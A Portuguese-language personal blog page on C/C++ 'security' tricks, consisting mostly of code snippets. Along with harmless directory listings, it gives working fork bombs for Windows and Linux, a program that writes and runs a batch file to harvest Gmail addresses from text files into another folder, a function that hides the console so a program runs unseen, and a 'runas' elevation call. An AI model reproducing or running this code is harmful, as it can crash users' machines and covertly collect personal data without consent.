<!DOCTYPE html>                               
<html>    
  <head>   
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/pygment_trac.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">

    <title>C/C++ by rodcaseribe</title>                           
  </head>                       

  <body>
    <header>                                  
    
      <div class="container">                                                                                                
        <!--<h4 style="color:#009900">$service glusterfs-server start</h4>--><p><code><pre><img align="left" width="140px" height="140px" src="https://fbcdn-profile-a.akamaihd.net/hprofile-ak-xpa1/v/t1.0-1/p160x160/11666123_680963255338867_3272092498190692095_n.jpg?oh=e455ffa32a074cff960d2ad2b2437041&oe=56706719&__gda__=1449916324_23bb04b85b24a3fc5dc23431f241d2fd"></img>
        <h3 align="middle"> -->">Rodolfo Cr</h3><h3 align="middle">undergroundiscovery@gmail.com</h3><br><br><h5 align="left" "style="color:#880000"><a href="https://github.com/rodcaseribe"><img width="40px" height="40px" src="http://icons.iconarchive.com/icons/social-media-icons/social-buntings/512/Github-icon.png"></img></a></h5></pre></code></p>
        <!--<h2 align="center">C/C++</h2>-->    
        <!--<section id="downloads">
          <a href="https://github.com/rodcaseribe/guster/zipball/master" class="btn">Download as .zip</a>
          <a href="https://github.com/rodcaseribe/guster/tarball/master" class="btn">Download as .tar.gz</a>
          <a href="https://github.com/rodcaseribe/guster" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>-->
      </div>  
    </header>
    <div class="container">
      <section id="main_content">
        <h3>
<a id="welcome-to-github-pages" class="anchor" href="#welcome-to-github-pages" aria-hidden="true"><span class="octicon octicon-link">C/C++</span></a></h3>

<p>Irei falar um pouco sobre C e C++, algumas coisas bacanas da linguagem sobre segurança.</p><br>
<p><a href="" class="user-mention">*Explorando o System<br>
</a></p>
<br>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]) {
system("dir C:"); //listando
}</code></pre></h5></h5></h5></h5>
<p>Bom até aqui nada de novo , vemos que com o system padrão ensinado na faculdade conseguimos executar comandos DOS no caso do Windows.</p></h5></h5>
<p>Podemos fazer também com ponteiros:</p></h5></h5>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dirent.h&gt; //header dirent

int main(void)
{
DIR *pont; //ponteiro pra dir
struct dirent *entrada;  //Data Type padrão
pont = opendir("c:\\");
while ( ( entrada = readdir(pont) ) != NULL )
{
printf ("%s\n", entrada-&gt;d_name);
}
closedir(pont);
return 0;
}
</code></pre>
<p>Bom, podemos também fazer chamadas externas, executáveis por exemplo com comando Start do MSDOS já que estamos em cima de Windows</p></h5></h5>
<code><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]) {
system("start /Max c.exe");
system("pause");
return 0;
}</pre></code>
<p>Aí fica da criatividade de executar qualquer comando DOS de quem cria.</p><br><p>Uma coisa bacana é varrer pasta onde normalmente não se tem permissão no Windows 7 jogando em outra, e pegar emails por exemplo.</p></h5></h5></h5>
<code><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main(int argc, char *argv[]) {
FILE *fp;
fp = fopen("file99.bat","w+");  //habilito gravacao em arquivo, no caso bat ja que estamos em cima de Windows
fprintf(fp, "%s" "%s", "cd / \n","findstr @gmail.com *.txt &gt;C:/Users/rodolfo/Documents/peguei.txt"); //  filtro por find e jogo onde tem permissão
fclose(fp);
system("start /Max file99.bat");
return 0;
}</pre></code>
<p>Aqui crio um ponteiro e dou permissão de gravação onde assim insiro os comando com "fprint", filtrando e jogando em outra pasta e no final executo o "*.bat".<br>
</p>
<p><a href="" class="user-mention">*Bomb-Fork básico no Windows 7<br>
</a></p>
<br>
<code><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include&lt;windows.h&gt;
int main(int argc, char *argv[]) {
FILE * fp;
fp = fopen ("red.bat","w+");
fprintf(fp, "%s" "%s" "%s",":12 \n","@start %0 \n","@goto 12");
fclose(fp);
system("start /Max red.bat");
return(0);
}</pre></code>
<p>Mesmo conceito, porém criei um loop infinito no DOS  onde instancio e chamo com @goto.
No Linux podemos usar o unistd.h pra acessar diretamente os ficheiros e diretorios, já temos até um fork pronto basicamente, só jogar true no while e ser feliz.</p>

<code><pre>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(){
while (1) {
fork();
}
return(0);
}</pre></code>
<p>Maravilha, mais e aí como executar isso em segundo plano!? Afinal, e se eu não quiser mostrar o console e rodar meu programa em Background.

Tem uma função simples pra isso:</p>
<code><pre>void stealth (){
HWND stealth;
AllocConsole();
stealth = FindWindowA("consoleWindowClass", NULL);
ShowWindow(stealth, 0);
}
</pre></code>
<p>Ok, mais e por exemplo o UAC(User Acount Control), para termos acesso ao registro teremos q permissão administrativa, então queremos que ele rode somente com permissão administrativa.<br></h5>Exemplo:</p></h5></h5>
<pre><code>#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
int main()
{
    char *application = "c:\\windows\\system32\\notepad.exe"; //executa o notepad com permissão administrativa
    ShellExecute(NULL, "runas", application, NULL, NULL, SW_SHOWDEFAULT);
}</code></pre></h5></h5></h5></h5>
    
  </body>
</html>
